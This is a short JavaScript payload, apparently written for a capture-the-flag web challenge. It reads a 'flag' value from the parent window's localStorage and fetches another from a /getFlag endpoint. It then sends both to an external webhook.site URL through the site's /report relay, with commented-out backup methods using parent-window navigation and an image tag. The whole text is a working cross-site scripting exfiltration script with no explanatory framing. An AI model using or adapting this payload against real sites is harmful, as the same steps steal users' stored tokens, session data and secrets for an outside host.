(function() {
    // Step A: Steal the flag from localStorage
    var flag = window.parent.localStorage.getItem('flag');

    // Step B: Also try fetching from /getFlag endpoint
    fetch('/getFlag', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ giveMe: 'theFlag' })
    })
    .then(r => r.text())
    .then(function(serverFlag) {
        // Exfiltrate both localStorage flag AND server flag
        var exfilUrl = 'https://webhook.site/d06624a7-0585-4a81-971a-d41dd30e1dcb/?flag=' 
            + encodeURIComponent(flag) 
            + '&serverFlag=' + encodeURIComponent(serverFlag);

        // Method 1: Use /report as a relay
        fetch('/report?url=' + encodeURIComponent(exfilUrl));

        // Method 2 (backup): navigate the parent window directly
        // window.parent.location.href = exfilUrl;

        // Method 3 (backup): img tag
        // var img = new Image();
        // img.src = exfilUrl;
        // document.body.appendChild(img);
    });
})();
